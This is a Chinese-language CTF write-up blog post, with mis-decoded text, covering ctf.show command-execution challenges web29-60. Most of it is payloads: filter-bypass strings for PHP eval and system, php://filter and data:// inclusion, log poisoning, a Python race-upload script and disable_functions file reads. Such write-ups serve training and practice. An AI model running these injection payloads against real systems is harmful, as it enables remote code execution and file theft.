    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>VIPé¢˜ç›®ï¼Œæƒ…å†µæå¤šï¼Œè®°å½•ï¼</p>
<span id="more"></span>

<h1 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">é€šé…ç¬¦</span><br><span class="line">payload1:c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla?????&quot;</span>);</span><br><span class="line">payload2:c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla*&quot;</span>);</span><br><span class="line">payload3:c=<span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.php`;æˆ–è€…c=<span class="keyword">echo</span> `nl flâ€œâ€ag.php`;</span><br><span class="line">payload4:c=<span class="keyword">echo</span> `nl fl\ag.php`;<span class="comment">//è½¬ä¹‰å­—ç¬¦ç»•è¿‡</span></span><br><span class="line">payload5:c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">payload6:c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);</span><br><span class="line">payload7:c=awk <span class="string">&#x27;&#123;printf $0&#125;&#x27;</span> flag.php||</span><br><span class="line">è¿˜æœ‰å¾ˆå¤šå§¿åŠ¿ï¼Œæ¯•ç«Ÿç­‰äºæ²¡è¿‡æ»¤</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h1><p>åœ¨ä¸Šä¸€é“é¢˜çš„åŸºç¡€ä¸Šå¤šäº†<code>systemå’Œphp</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">åå¼•å· åŒ<span class="title function_ invoke__">shell_exec</span>() </span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;nl fla?????&#x27;</span>);</span><br><span class="line">c=<span class="keyword">echo</span> `nl fla<span class="string">&#x27;&#x27;</span>g.p<span class="string">&#x27;&#x27;</span>hp`;</span><br><span class="line">c=<span class="keyword">echo</span> `nl fla?????`;</span><br><span class="line">è¿˜æœ‰ä¸Šä¸€é“é¢˜çš„å¾ˆå¤špayloadéƒ½å¯ä»¥ä½¿ç”¨</span><br></pre></td></tr></table></figure>


<h1 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h1><p>è¿‡æ»¤äº†<code>cat\sortç­‰</code>,ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†å°è¯•äº†ä¸€å †æ–¹æ³•æ— æœï¼Œå°è¯•æéªšå¾—</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>catè¢«è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</span><br><span class="line">less:ä¸ more ç±»ä¼¼ head:æŸ¥çœ‹å¤´å‡ è¡Œ</span><br><span class="line">tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯</span><br><span class="line">cat çš„åå‘æ˜¾ç¤º</span><br><span class="line">tail:æŸ¥çœ‹å°¾å‡ è¡Œ</span><br><span class="line">nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</span><br><span class="line">od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</span><br><span class="line">vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">sort:å¯ä»¥æŸ¥çœ‹</span><br><span class="line">uniq:å¯ä»¥æŸ¥çœ‹ file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹ grep</span><br><span class="line"><span class="number">1</span>ã€åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š grep test *file strings</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line">c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>fl[abc]*`);</span><br><span class="line">c=<span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;nl%09fl[a]*&quot;</span>);ç­‰ä»·äº<span class="title function_ invoke__">system</span>()</span><br><span class="line">c=<span class="keyword">echo</span>`strings%<span class="number">09</span>f*`;</span><br><span class="line">c=<span class="keyword">echo</span>`strings\<span class="variable">$IFS</span>\$<span class="number">9</span>f*`å¿…é¡»åŠ è½¬ä¹‰å­—ç¬¦</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿˜æœ‰å…¶ä»–å§¿åŠ¿ï¼š<br>é¦–å…ˆprint_r(scandir(dirname(<strong>FILE</strong>)));æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶<br>ç„¶åæ‰¾åˆ°flag.php<br>print_r(next(array_reverse(scandir(dirname(<strong>FILE</strong>)))));<br>ä¹‹åé«˜äº®æ˜¾ç¤ºå³å¯<br>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(<strong>FILE</strong>)))));</p>
<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p>å°çŸ¥è¯†ï¼šincludeä¸ç”¨æ‹¬å·ï¼Œåˆ†å·å¯ä»¥ç”¨?&gt;ä»£æ›¿ã€‚<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-</span></span><br><span class="line">encode/resource=flag.php</span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h1><p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><p>payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line">è¿˜å¯ä»¥é…åˆUAå¤´æ‰§è¡Œæ—¥å¿—åŒ…å«</span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><p>åœ¨ä¸Šä¸€é“é¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†phpï¼Œå’Œfile<br>æ‰€ä»¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=</span></span><br><span class="line">ä¹Ÿå¯ä»¥æ—¥å¿—åŒ…å«</span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system(â€œcat f*â€);?&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><p>æˆ‘å­—æ¯æ•°å­—RCEï¼Œæˆ‘ä¹‹åä¼šå¦ä¸€èµ·ä¸€ç¯‡ï¼Œå•ç‹¬è®²è¿™ä¸ªã€‚</p>
<h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>ï¼Œè®©æ‰€æœ‰çš„è¾“å‡ºæµï¼ˆåŒ…æ‹¬é”™è¯¯çš„å’Œæ­£ç¡®çš„ï¼‰éƒ½å®šå‘åˆ°ç©ºè®¾å¤‡ä¸¢å¼ƒ</span><br><span class="line">æ‰€ä»¥ä¸èƒ½è®©åé¢æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦æŠŠåé¢æˆªæ–­ls;%<span class="number">0</span>a,åé¢ä¸ç”¨å¤šè¯´äº†å§,è¿˜å¯ä»¥ç”¨%<span class="number">26</span>ä»¥åŠ||</span><br></pre></td></tr></table></figure>


<h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><p>å’Œ42æ²¡å¤šå¤§åŒºåˆ«ã€‚ã€‚ã€‚ã€‚ï¼Œè¿‡æ»¤äº†cat<code>nl%20flag.php%0a</code></p>
<h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><p>è¿‡æ»¤äº†flag,æ²¡å•¥å¥½è¯´çš„é€šé…ç¬¦å‘—</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">20</span>fl*%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<h1 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h1><p>å¤šè¿‡æ»¤äº†ä¸€ä¸ªç©ºæ ¼ï¼Œæ€»æ‰€å‘¨çŸ¥phpç¯å¢ƒä¸‹å¯ä»¥ç”¨%09ä»£é¢˜ç©ºæ ¼<br>c&#x3D;nl%09fl*%0a<br>æˆ–è€…ä½¿ç”¨å†…è”æ‰§è¡Œ<br>c&#x3D;echoåå¼•å·nl$IFS*åå¼•å·%0A</p>
<h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><p>å¤šè¿‡æ»¤äº†ä¸€äº›æ•°å­—å•¥çš„ï¼Œç­‰äºæ²¡æ¥ï¼Œç„¶åè¿‡æ»¤äº†flagä¹Ÿå¯ä»¥å…¶ä»–å§¿åŠ¿\ â€˜â€™ â€œâ€ç­‰ç­‰éƒ½è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿˜å¯ä»¥æ˜¯,å› ä¸º||é»˜è®¤æ˜¯å‰é¢æˆåŠŸåˆ™ä¸æ‰§è¡Œåé¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">09</span>fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web47-48"><a href="#web47-48" class="headerlink" title="web47-48"></a>web47-48</h1><p>è¿‡æ»¤äº†ä¸€ç‚¹å‘½ä»¤ç­‰äºæ²¡è¯´</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><p>çœ‹äº†ä¸€çœ¼ï¼Œä¹Ÿå°±æ˜¯å¤šè¿‡æ»¤äº†å‡ ä¸ªå‘½ä»¤è€Œå·²ï¼Œè¿™é‡Œå½“ä½œç»ƒä¹ å¤šç»™ç‚¹payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1:c=nl%<span class="number">09</span>fla\g.php||</span><br><span class="line">payload2:c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload3:c=nl%<span class="number">09</span>fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a</span><br><span class="line">payload4:c=nl%<span class="number">09</span>fla<span class="string">&quot;&quot;</span>g.php%<span class="number">0</span>a</span><br><span class="line">payload5:c=vi%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload6:c=tac%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload7:c=uniq%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload8:c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br><span class="line">payload9:c=nl%<span class="number">09</span>fla\g.php%<span class="number">26</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><p>æˆ‘çœ‹äº†ä¸€çœ¼%09è¢«è¿‡æ»¤äº†ï¼Œé™¤æ­¤ä¹‹å¤–ä¹Ÿæ²¡å•¥æ–°çš„åŸºæœ¬ä¸Šï¼Œéšä¾¿æ¥ä¸ªpayloadè¿›å…¥ä¸‹ä¸€å…³å§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><p>å•Šè¿™ï¼Œçœ‹äº†ä¸€çœ¼%ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡ä¹Ÿæ²¡å•¥ï¼Œè¿˜æ˜¯ä¸Šä¸€é“çš„payloadcï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><p>è™½ç„¶å¾ˆå¤šèƒ½å½“ç©ºæ ¼çš„éƒ½è¢«è¿‡æ»¤äº†ä½†æ˜¯ï¼Œ<code>$</code>å´æ²¡æœ‰è¿‡æ»¤ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl<span class="variable">$IFS</span>\fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><p>æ„Ÿè§‰æ¢äº†ä¸€ä¸ªç³»åˆ—å§ï¼Œè¿™é‡Œéšä¾¿æ¥ä¸¤ä¸ªpayload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1:c<span class="string">&#x27;&#x27;</span>at$&#123;IFS&#125;fla<span class="string">&#x27;&#x27;</span>g.p<span class="string">&#x27;&#x27;</span>hp</span><br><span class="line">payload2:c=nl<span class="variable">$IFS</span>\fla\g.php</span><br></pre></td></tr></table></figure>




<h1 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h1><p>åŠ å¼ºäº†æ­£åˆ™è¡¨è¾¾å¼ï¼Œé€šé…ç¬¦å°±è¡Œäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=/bin/c??$&#123;IFS&#125;????????</span><br><span class="line">c=/bin/c??<span class="variable">$IFS</span>????????</span><br></pre></td></tr></table></figure>


<h1 id="web55-56"><a href="#web55-56" class="headerlink" title="web55-56"></a>web55-56</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    url = <span class="string">&quot;http://44875025-cec2-4154-8d87-34cbdcff5f27.chall.ctf.show/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, b<span class="string">&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.<span class="title function_ invoke__">find</span>(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://s2.loli.net/2022/03/26/ez4BhNt5li6Zy3n.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=/???/????<span class="number">64</span> ????????</span><br></pre></td></tr></table></figure>


<h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><p>è¿™é“é¢˜çš„ç›®çš„æ˜¯æ„é€ <code>36</code>è¿™ä¸ªæ•°å­—,è¿™é‡Œåˆ©ç”¨äº†<code>$(( ))ä¸æ•´æ•°è¿ç®—</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(())------æ˜¯-<span class="number">1</span></span><br><span class="line">$((~<span class="number">37</span>))------æ˜¯<span class="number">36</span></span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿è¯ä¸­é—´æ˜¯-<span class="number">37</span>å³å¯ï¼Œ</span><br><span class="line">$((~$(())$(())))---æ˜¯<span class="number">1</span></span><br><span class="line">æ‰€ä»¥</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))ä»£è¡¨<span class="number">36</span>ï¼Œå³å¯è·å–flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><p>æ¥ä¸‹æ¥çš„ç³»åˆ—æ˜¯ç»•è¿‡disable_functionsç³»åˆ—ï¼Œä¸ºäº†é”»ç‚¼è‡ªå·±æˆ‘å†³å®šå¤šå°è¯•å‡ ç§å§¿åŠ¿ï¼Œéƒ½æ˜¯ä»ç¾½å¸ˆå‚…é‚£é‡Œå­¦ä¹ åˆ°çš„ï¼Œå‚è€ƒé“¾æ¥è§ä¸‹æ–¹</p>
<p>é¦–å…ˆè¦è·å–æ–‡ä»¶è·¯å¾„ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸¤ç§æ–¹å¼ï¼Œæˆ‘æš‚æ—¶æƒ³åˆ°è¿™ä¸¤ç§</p>
<p><code>c=print_r(scandir(dirname(&#39;``**FILE**``&#39;)));</code></p>
<p><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code>å› ä¸ºæ²¡æœ‰ä»»ä½•è¿‡æ»¤æˆ‘ä»¬ä¾¿å¯ä»¥è¯»å–ä»»æ„çš„æ–‡ä»¶</p>
<p><code>c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é€šè¿‡å•ä¸€å‡½æ•°è¯»å–æ–‡ä»¶</span></span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line"><span class="comment">//è¿™é‡Œåšä¸€ä¸ªè§£é‡Š`file â€” æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­`</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">é€šè¿‡fopenå»è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¿™é‡Œä»‹ç»ä¸‹å‡½æ•°</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetc</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetcsv</span>()</span><br><span class="line"><span class="title function_ invoke__">gpassthru</span>()</span><br><span class="line">payload:</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//ä¸€è¡Œä¸€è¡Œè¯»å–</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è¯»å–</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é€šè¿‡é«˜äº®æ˜¾ç¤ºphpæ–‡ä»¶</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);             </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);             </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h1><p>é¦–å…ˆæŸ¥æ‰¾flagæ–‡ä»¶çš„åœ°å€<code>c=print_r(scandir(&#39;./&#39;));</code>æ‰¾åˆ°åœ¨å½“å‰ç›®å½•ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//paylaodæ±‡æ€»</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;flag.php&quot;</span>)); </span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h1><p>é¦–å…ˆæŸ¥æ‰¾flagæ–‡ä»¶çš„åœ°å€<code>c=print_r(scandir(&#39;./&#39;));</code>æ‰¾åˆ°åœ¨å½“å‰ç›®å½•ä¸‹</p>
